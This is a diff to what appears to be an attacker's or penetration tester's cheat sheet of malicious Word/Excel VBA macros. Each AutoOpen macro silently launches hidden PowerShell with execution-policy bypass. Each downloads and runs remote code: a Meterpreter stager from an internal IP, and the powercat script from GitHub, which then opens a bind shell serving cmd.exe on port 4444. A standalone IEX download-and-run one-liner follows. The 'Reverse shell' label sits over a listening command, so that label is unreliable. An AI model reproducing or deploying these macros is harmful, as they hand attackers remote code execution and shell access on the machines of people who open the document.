@@ -1,13 +1,19 @@
-
+﻿
 
 # Meterpreter
 Sub AutoOpen()
     Call Shell("powershell.exe -w hidden -nop -ep bypass -c ""$enable = (get-itemproperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyEnable; $webproxy = (get-itemproperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer; $wc = new-object system.net.WebClient; $url = 'http://172.30.207.111:8080/shell'; if( $enable -eq 1 ) { $proxy = new-object System.Net.WebProxy; $proxy.Address = $webproxy; $wc.proxy = $proxy; }; $webpage = $wc.downloadstring($url) | iex; Read-Host '...';""", 1)
 End Sub
 
-# NetCat
+# NetCat - Bind shell
 Sub AutoOpen()
-    Call Shell("powershell.exe -w hidden -nop -ep bypass -c ""$enable = (get-itemproperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyEnable; $webproxy = (get-itemproperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer; $wc = new-object system.net.WebClient; $url = 'http://172.30.207.111:8080/shell'; if( $enable -eq 1 ) { $proxy = new-object System.Net.WebProxy; $proxy.Address = $webproxy; $wc.proxy = $proxy; }; $webpage = $wc.downloadstring($url) | iex; Read-Host '...';""", 1)
+    Call Shell("powershell.exe -w hidden -nop -ep bypass -c ""$enable = (get-itemproperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyEnable; $webproxy = (get-itemproperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer; $wc = new-object system.net.WebClient; $url = 'https://github.com/karlmaborg/powercat/raw/master/powercat.ps1'; if( $enable -eq 1 ) { $proxy = new-object System.Net.WebProxy; $proxy.Address = $webproxy; $wc.proxy = $proxy; }; $webpage = $wc.downloadstring($url) | iex; powercat -l -p 4444 -e 'C:\Windows\System32\cmd.exe'; Read-Host '...';""", 1)
 End Sub
 
+# NetCat - Reverse shell
+Sub AutoOpen()
+    Call Shell("powershell.exe -w hidden -nop -ep bypass -c ""$enable = (get-itemproperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyEnable; $webproxy = (get-itemproperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer; $wc = new-object system.net.WebClient; $url = 'https://github.com/karlmaborg/powercat/raw/master/powercat.ps1'; if( $enable -eq 1 ) { $proxy = new-object System.Net.WebProxy; $proxy.Address = $webproxy; $wc.proxy = $proxy; }; $webpage = $wc.downloadstring($url) | iex; powercat -l -p 4444 -e cmd; Read-Host '...';""", 1)
+End Sub
 
+# Powercat
+IEX (New-Object System.Net.Webclient).DownloadString('https://github.com/karlmaborg/powercat/raw/master/powercat.ps1')
